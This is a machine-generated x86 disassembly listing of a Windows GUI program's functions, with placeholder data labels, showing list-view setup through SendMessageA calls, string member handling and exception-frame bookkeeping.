mov [ esp + 0xd0 ] 0xb
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
lea ecx [ esp + 0x18 ]
call sub_43de8a
cmp eax 0x1
jne r-xdata
push ebx
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xcc ] 0x6
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xcc ] 0x5
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xcc ] 0x4
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xcc ] 0x3
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xcc ] 0x2
call sub_442148
mov [ esp + 0xcc ] 0x1
jmp r-xdata
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xcc ] 0x19
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xcc ] 0x18
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xcc ] 0x17
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xcc ] 0x16
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xcc ] 0x15
call sub_442148
mov [ esp + 0xcc ] 0x14
mov eax [ rw-data ]
mov [ esp + 0x10 ] eax
push ebx
lea ecx [ esp + 0x18 ]
push edi
push ecx
mov ecx esi
mov [ esp + 0xd8 ] 0xc
call sub_43c1f0
mov edx [ eax ]
lea eax [ esp + 0x10 ]
push edx
push rw-data
push eax
mov [ esp + 0xd8 ] 0xd
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x14 ]
mov [ esp + 0xcc ] 0xc
call sub_442148
mov eax [ esp + 0x10 ]
mov edx [ ebp + 0x98 ]
lea esi [ ebp + 0x98 ]
push ebx
push eax
push 0xffffffff
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x74 ]
call sub_44f0ac
lea ecx [ esp + 0x18 ]
mov [ esp + 0xcc ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0xc4 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0xc0
retn
mov edx [ esi ]
mov ecx esi
call [ edx + 0x24 ]
lea eax [ esp + 0xbc ]
lea ecx [ ebp + 0x1ac ]
push eax
call sub_442281
lea ecx [ esp + 0xb8 ]
push ecx
lea ecx [ ebp + 0x1b8 ]
call sub_442281
lea edx [ esp + 0xc0 ]
lea ecx [ ebp + 0x1b4 ]
push edx
call sub_442281
lea eax [ esp + 0xb0 ]
lea ecx [ ebp + 0x1b0 ]
push eax
call sub_442281
lea ecx [ esp + 0xb4 ]
push ecx
lea ecx [ ebp + 0x1a8 ]
call sub_442281
mov edx [ esi ]
mov ecx esi
call [ edx + 0x28 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
mov ecx ebp
call sub_404f30
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
push ebx
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xcc ] 0x13
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xcc ] 0x12
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xcc ] 0x11
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xcc ] 0x10
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xcc ] 0xf
call sub_442148
mov [ esp + 0xcc ] 0xe
jmp r-xdata
sub_4057c0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_45c6d0
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
push edi
mov edi ecx
push 0x0
push 0x0
push 0x1042
mov eax [ edi + 0x78 ]
push eax
call [ SendMessageA@IAT ]
test eax eax
jge r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x8 ] ecx
push 0x0
lea edx [ esp + 0x10 ]
push eax
push edx
lea ecx [ edi + 0x5c ]
mov [ esp + 0x24 ] 0x0
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
mov [ esp + 0x24 ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0xc ]
mov [ esp + 0x18 ] 0x0
call sub_442148
mov eax [ esp + 0x8 ]
mov edx [ edi + 0x98 ]
lea esi [ edi + 0x98 ]
push 0x0
push eax
push 0xffffffff
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop edi
pop esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov edx [ esi ]
mov ecx esi
call [ edx + 0x2c ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
mov ecx edi
call sub_404f30
push eax
push eax
push rw-data
call sub_4496b7
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_4058c0
push 0xffffffff
push sub_45c7d1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xb4
push ebx
push ebp
push esi
mov ebp ecx
xor ebx ebx
push edi
push ebx
lea ecx [ esp + 0x1c ]
call sub_405cf0
push 0x1
mov ecx ebp
mov [ esp + 0xd0 ] ebx
call sub_440b18
mov eax [ ebp + 0x78 ]
push ebx
push ebx
push 0x1042
push eax
call [ SendMessageA@IAT ]
mov edi eax
cmp edi ebx
jge r-xdata
push 0x1
lea ecx [ esp + 0x14 ]
lea esi [ ebp + 0x5c ]
push edi
push ecx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xd0 ] 0x7
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
push 0x4
lea edx [ esp + 0x14 ]
push edi
push edx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xbc ]
mov [ esp + 0xd0 ] 0x8
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
push 0x3
lea eax [ esp + 0x14 ]
push edi
push eax
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xc4 ]
mov [ esp + 0xd0 ] 0x9
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
push 0x2
lea ecx [ esp + 0x14 ]
push edi
push ecx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xd0 ] 0xa
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
push ebx
lea edx [ esp + 0x14 ]
push edi
push edx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xd0 ] 0xb
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
lea ecx [ esp + 0x18 ]
call sub_43de8a
cmp eax 0x1
jne r-xdata
push ebx
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xcc ] 0x6
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xcc ] 0x5
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xcc ] 0x4
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xcc ] 0x3
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xcc ] 0x2
call sub_442148
mov [ esp + 0xcc ] 0x1
jmp r-xdata
mov ecx [ esp + 0xd8 ]
mov [ ecx ] ebx
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xcc ] 0x19
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xcc ] 0x18
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xcc ] 0x17
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xcc ] 0x16
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xcc ] 0x15
call sub_442148
mov [ esp + 0xcc ] 0x14
mov eax [ rw-data ]
mov [ esp + 0x10 ] eax
push ebx
lea ecx [ esp + 0x18 ]
push edi
push ecx
mov ecx esi
mov [ esp + 0xd8 ] 0xc
call sub_43c1f0
mov edx [ eax ]
lea eax [ esp + 0x10 ]
push edx
push rw-data
push eax
mov [ esp + 0xd8 ] 0xd
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x14 ]
mov [ esp + 0xcc ] 0xc
call sub_442148
mov eax [ esp + 0x10 ]
mov edx [ ebp + 0x98 ]
lea esi [ ebp + 0x98 ]
push ebx
push eax
push 0xffffffff
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x74 ]
call sub_44f0ac
lea ecx [ esp + 0x18 ]
mov [ esp + 0xcc ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0xc4 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0xc0
retn 0x8
mov edx [ esi ]
mov ecx esi
call [ edx + 0x24 ]
lea eax [ esp + 0xbc ]
lea ecx [ ebp + 0x1ac ]
push eax
call sub_442281
lea ecx [ esp + 0xb8 ]
push ecx
lea ecx [ ebp + 0x1b8 ]
call sub_442281
lea edx [ esp + 0xc0 ]
lea ecx [ ebp + 0x1b4 ]
push edx
call sub_442281
lea eax [ esp + 0xb0 ]
lea ecx [ ebp + 0x1b0 ]
push eax
call sub_442281
lea ecx [ esp + 0xb4 ]
push ecx
lea ecx [ ebp + 0x1a8 ]
call sub_442281
mov edx [ esi ]
mov ecx esi
call [ edx + 0x28 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
mov ecx ebp
call sub_404f30
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
push ebx
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
mov [ esp + 0xcc ] bl
call sub_442148
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xcc ] 0x13
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xcc ] 0x12
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xcc ] 0x11
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xcc ] 0x10
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xcc ] 0xf
call sub_442148
mov [ esp + 0xcc ] 0xe
jmp r-xdata
sub_405cf0
push 0xffffffff
push sub_45c839
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
push 0x99
mov [ esp + 0x18 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x1c ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
mov edx [ rw-data ]
lea ecx [ esi + 0x98 ]
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0x9c ]
mov [ edi ] eax
mov edx [ rw-data ]
lea ebx [ esi + 0xa0 ]
mov [ ebx ] edx
mov eax [ rw-data ]
lea ebp [ esi + 0xa4 ]
mov [ ebp ] eax
mov edx [ rw-data ]
mov [ esi + 0xa8 ] edx
push rw-data
mov [ esp + 0x20 ] 0x6
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
lea ecx [ esi + 0xa8 ]
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_405e10
push 0xffffffff
push sub_45c8c1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x128
push esi
mov esi ecx
call sub_43e113
push 0x0
lea ecx [ esp + 0x8 ]
call sub_40a470
push 0x0
push rw-data
push 0xffffffff
lea ecx [ esp + 0x10 ]
mov [ esp + 0x140 ] 0x0
call sub_42182c
test eax eax
jne r-xdata
mov eax [ esp + 0xcc ]
test eax eax
jne r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
lea ecx [ esp + 0x128 ]
mov [ esp + 0x134 ] 0x6
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x134 ] 0x5
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x134 ] 0x4
call sub_442148
lea ecx [ esp + 0x11c ]
mov [ esp + 0x134 ] 0x3
call sub_442148
lea ecx [ esp + 0x118 ]
mov [ esp + 0x134 ] 0x2
call sub_442148
lea ecx [ esp + 0x114 ]
mov [ esp + 0x134 ] 0x1
call sub_442148
lea ecx [ esp + 0x4 ]
mov [ esp + 0x134 ] 0xffffffff
call sub_421723
xor eax eax
pop esi
mov ecx [ esp + 0x128 ]
mov [ fs : 0x0 ] ecx
add esp 0x134
retn
lea ecx [ esp + 0x4 ]
call sub_421900
lea ecx [ esp + 0x128 ]
mov [ esp + 0x134 ] 0xc
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x134 ] 0xb
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x134 ] 0xa
call sub_442148
lea ecx [ esp + 0x11c ]
mov [ esp + 0x134 ] 0x9
call sub_442148
lea ecx [ esp + 0x118 ]
mov [ esp + 0x134 ] 0x8
call sub_442148
lea ecx [ esp + 0x114 ]
mov [ esp + 0x134 ] 0x7
call sub_442148
lea ecx [ esp + 0x4 ]
mov [ esp + 0x134 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x12c ]
mov eax 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x134
retn
push edi
mov edi [ SendMessageA@IAT ]
mov eax [ esp + 0x118 ]
mov ecx [ esi + 0x78 ]
push eax
push 0x0
push 0x143
push ecx
call edi
mov edx [ esp + 0x8 ]
push 0x1
push 0x1
lea ecx [ esp + 0x10 ]
call [ edx + 0x14 ]
mov eax [ esp + 0xd0 ]
test eax eax
je r-xdata
pop edi
sub_406020
push esi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0x9c ]
mov ecx [ eax - 0x8 ]
test ecx ecx
jne r-xdata
mov ecx [ esi + 0x98 ]
mov eax [ ecx - 0x8 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
mov edx [ esi + 0xa4 ]
mov eax [ edx - 0x8 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
mov ecx esi
call sub_43e178
pop esi
retn
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
sub_4060a0
push 0xffffffff
push sub_45c91e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
mov [ esp + 0x14 ] esi
call sub_421517
mov edx [ rw-data ]
lea ecx [ esi + 0x110 ]
mov [ esp + 0x1c ] 0x0
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0x114 ]
mov [ edi ] eax
mov edx [ rw-data ]
lea ebp [ esi + 0x118 ]
mov [ ebp ] edx
mov eax [ rw-data ]
lea ebx [ esi + 0x11c ]
mov [ ebx ] eax
mov edx [ rw-data ]
mov [ esi + 0x120 ] edx
push rw-data
mov [ esp + 0x20 ] 0x5
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
lea ecx [ esi + 0x120 ]
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov [ esi + 0x14 ] 0x5
mov [ esi + 0x8c ] 0x1
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_4061b0
push 0xffffffff
push sub_45c970
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x120 ]
mov [ esp + 0x10 ] 0x4
call sub_442148
lea ecx [ esi + 0x11c ]
mov [ esp + 0x10 ] 0x3
call sub_442148
lea ecx [ esi + 0x118 ]
mov [ esp + 0x10 ] 0x2
call sub_442148
lea ecx [ esi + 0x114 ]
mov [ esp + 0x10 ] 0x1
call sub_442148
lea ecx [ esi + 0x110 ]
mov [ esp + 0x10 ] 0x0
call sub_442148
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4062a0
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
push 0x0
push 0xc
lea eax [ esi + 0x110 ]
push 0xff
push eax
push rw-data
push edi
mov [ edi + 0x8 ] 0x0
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x114 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x118 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x11c ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
add esi 0x120
push 0xff
push esi
push rw-data
push edi
call sub_4246fa
pop edi
pop esi
retn 0x4
sub_406340
push 0xffffffff
push sub_45c993
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
push edi
mov esi ecx
push eax
push 0x9a
mov [ esp + 0x10 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x14 ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
push 0x0
lea ecx [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
call sub_407960
mov ecx [ esp + 0xc ]
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_4063e0
push 0xffffffff
push sub_45ca01
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
push edi
mov edi ecx
mov [ esp + 0x8 ] edi
mov [ esp + 0x18 ] 0x0
lea esi [ edi + 0x98 ]
mov [ esp + 0xc ] esi
lea ecx [ esi + 0x124 ]
mov [ esp + 0x18 ] 0x7
call sub_442148
lea ecx [ esi + 0x120 ]
mov [ esp + 0x18 ] 0x6
call sub_442148
lea ecx [ esi + 0x11c ]
mov [ esp + 0x18 ] 0x5
call sub_442148
lea ecx [ esi + 0x118 ]
mov [ esp + 0x18 ] 0x4
call sub_442148
lea ecx [ esi + 0x114 ]
mov [ esp + 0x18 ] 0x3
call sub_442148
lea ecx [ esi + 0x110 ]
mov [ esp + 0x18 ] 0x2
call sub_442148
mov ecx esi
mov [ esp + 0x18 ] 0x1
call sub_421723
lea ecx [ edi + 0x5c ]
mov [ esp + 0x18 ] 0x0
call sub_43c0ee
mov ecx edi
mov [ esp + 0x18 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_4064c0
push esi
push edi
mov esi ecx
call sub_43e113
push 0xffffffff
push 0xffffffff
lea edi [ esi + 0x5c ]
push 0x0
push rw-data
push 0x0
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x1
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x2
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x3
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x4
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x5
mov ecx edi
call sub_43c126
mov eax [ esi + 0x78 ]
mov edi [ SendMessageA@IAT ]
push 0x50
push 0x0
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x50
push 0x1
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x50
push 0x2
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x50
push 0x3
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x50
push 0x4
push 0x101e
push ecx
call edi
push 0x78
push 0x5
push 0x101e
mov edx [ esi + 0x78 ]
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x21
push 0x0
push 0x1036
push eax
call edi
mov ecx esi
call sub_4065d0
pop edi
mov eax 0x1
pop esi
retn
sub_4065d0
push 0xffffffff
push sub_45ca18
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
mov ebx [ SendMessageA@IAT ]
push esi
push edi
mov esi ecx
xor edi edi
mov eax [ esi + 0x78 ]
push edi
push edi
push 0x1009
push eax
call ebx
mov ecx [ esi + 0x78 ]
push edi
push edi
push 0xb
push ecx
call ebx
push 0x1
mov ecx esi
call sub_440b18
mov edx [ rw-data ]
mov [ esp + 0x10 ] edx
push rw-data
lea ecx [ esp + 0x14 ]
mov [ esp + 0x20 ] edi
call sub_4422d1
mov ecx [ esp + 0x10 ]
mov eax [ esi + 0x98 ]
lea ebp [ esi + 0x98 ]
push edi
push ecx
push 0xffffffff
mov ecx ebp
call [ eax + 0xc ]
test eax eax
jne r-xdata
cmp [ esi + 0x160 ] edi
jne r-xdata
push edi
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov eax [ ebp ]
mov ecx ebp
call [ eax + 0x10 ]
mov ecx [ esi + 0x78 ]
push 0x0
push 0x1
push 0xb
push ecx
call ebx
lea ebx [ esi + 0x5c ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x1c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi + 0x1a8 ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push edi
push 0x1
mov ecx ebx
call sub_43c179
mov eax [ esi + 0x1ac ]
mov ecx ebx
push eax
push 0x1
push edi
call sub_43c1c5
mov eax [ esi + 0x1b0 ]
mov ecx ebx
push eax
push 0x2
push edi
call sub_43c1c5
mov eax [ esi + 0x1b4 ]
mov ecx ebx
push eax
push 0x3
push edi
call sub_43c1c5
mov eax [ esi + 0x1b8 ]
mov ecx ebx
push eax
push 0x4
push edi
call sub_43c1c5
mov eax [ esi + 0x1bc ]
mov ecx ebx
push eax
push 0x5
push edi
call sub_43c1c5
mov edx [ ebp ]
push 0x1
push 0x1
mov ecx ebp
inc edi
call [ edx + 0x14 ]
mov eax [ esi + 0x160 ]
test eax eax
je r-xdata
mov ebx [ SendMessageA@IAT ]
sub_406740
push 0xffffffff
push sub_45cabc
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xb4
mov eax [ rw-data ]
push esi
push edi
mov edi ecx
mov [ esp + 0x8 ] eax
push 0x0
lea ecx [ esp + 0x10 ]
mov [ esp + 0xc8 ] 0x0
call sub_407500
mov [ esp + 0xc4 ] 0x1
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xc4 ] 0xf
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xc4 ] 0xe
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xc4 ] 0xd
call sub_442148
lea ecx [ esp + 0xac ]
mov [ esp + 0xc4 ] 0xc
call sub_442148
lea ecx [ esp + 0xa8 ]
mov [ esp + 0xc4 ] 0xb
call sub_442148
lea ecx [ esp + 0xa4 ]
mov [ esp + 0xc4 ] 0xa
call sub_442148
mov [ esp + 0xc4 ] 0x9
mov ecx [ esp + 0xa8 ]
lea edx [ esp + 0x8 ]
push ecx
push rw-data
push edx
call sub_43b5cc
mov ecx [ esp + 0x14 ]
mov eax [ edi + 0x98 ]
add esp 0xc
lea esi [ edi + 0x98 ]
push 0x0
push ecx
push 0xffffffff
mov ecx esi
call [ eax + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xc4 ] 0x8
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xc4 ] 0x7
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xc4 ] 0x6
call sub_442148
lea ecx [ esp + 0xac ]
mov [ esp + 0xc4 ] 0x5
call sub_442148
lea ecx [ esp + 0xa8 ]
mov [ esp + 0xc4 ] 0x4
call sub_442148
lea ecx [ esp + 0xa4 ]
mov [ esp + 0xc4 ] 0x3
call sub_442148
mov [ esp + 0xc4 ] 0x2
jmp r-xdata
mov eax [ edi + 0x134 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x68 ]
call sub_44f0ac
lea ecx [ esp + 0xc ]
mov [ esp + 0xc4 ] 0x0
call sub_43da87
lea ecx [ esp + 0x8 ]
mov [ esp + 0xc4 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0xbc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0xc0
retn
mov eax [ edi + 0x98 ]
lea esi [ edi + 0x98 ]
mov ecx esi
call [ eax + 0x20 ]
lea ecx [ esp + 0xb0 ]
push ecx
lea ecx [ edi + 0x1ac ]
call sub_442281
lea edx [ esp + 0xac ]
lea ecx [ edi + 0x1bc ]
push edx
call sub_442281
lea eax [ esp + 0xb4 ]
lea ecx [ edi + 0x1b4 ]
push eax
call sub_442281
lea ecx [ esp + 0xa4 ]
push ecx
lea ecx [ edi + 0x1b0 ]
call sub_442281
lea edx [ esp + 0xa8 ]
lea ecx [ edi + 0x1a8 ]
push edx
call sub_442281
lea eax [ esp + 0xb8 ]
lea ecx [ edi + 0x1b8 ]
push eax
call sub_442281
mov edx [ esi ]
mov ecx esi
call [ edx + 0x28 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
mov ecx edi
call sub_4065d0
push 0x0
push 0x0
push rw-data
call sub_4496b7
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
jmp r-xdata
lea ecx [ esp + 0xc ]
call sub_43de8a
cmp eax 0x1
jne r-xdata
sub_4069f0
push 0xffffffff
push sub_45cb29
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0xac ]
mov [ esp + 0x10 ] 0x6
call sub_442148
lea ecx [ esi + 0xa8 ]
mov [ esp + 0x10 ] 0x5
call sub_442148
lea ecx [ esi + 0xa4 ]
mov [ esp + 0x10 ] 0x4
call sub_442148
lea ecx [ esi + 0xa0 ]
mov [ esp + 0x10 ] 0x3
call sub_442148
lea ecx [ esi + 0x9c ]
mov [ esp + 0x10 ] 0x2
call sub_442148
lea ecx [ esi + 0x98 ]
mov [ esp + 0x10 ] 0x1
call sub_442148
lea ecx [ esi + 0x5c ]
mov [ esp + 0x10 ] 0x0
call sub_44f0ac
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_406aa0
push 0xffffffff
push sub_45cc54
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xb8
push ebx
push ebp
push esi
mov ebp ecx
xor ebx ebx
push edi
push ebx
lea ecx [ esp + 0x1c ]
call sub_407500
push 0x1
mov ecx ebp
mov [ esp + 0xd4 ] ebx
call sub_440b18
mov eax [ ebp + 0x78 ]
push ebx
push ebx
push 0x1042
push eax
call [ SendMessageA@IAT ]
mov edi eax
cmp edi ebx
jge r-xdata
push 0x1
lea ecx [ esp + 0x14 ]
lea esi [ ebp + 0x5c ]
push edi
push ecx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xd4 ] 0x8
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xd0 ] bl
call sub_442148
push 0x5
lea edx [ esp + 0x14 ]
push edi
push edx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xbc ]
mov [ esp + 0xd4 ] 0x9
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xd0 ] bl
call sub_442148
push 0x3
lea eax [ esp + 0x14 ]
push edi
push eax
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xc4 ]
mov [ esp + 0xd4 ] 0xa
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xd0 ] bl
call sub_442148
push 0x2
lea ecx [ esp + 0x14 ]
push edi
push ecx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xd4 ] 0xb
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0xd0 ] bl
call sub_442148
push ebx
lea edx [ esp + 0x14 ]
push edi
push edx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xd4 ] 0xc
call sub_442281
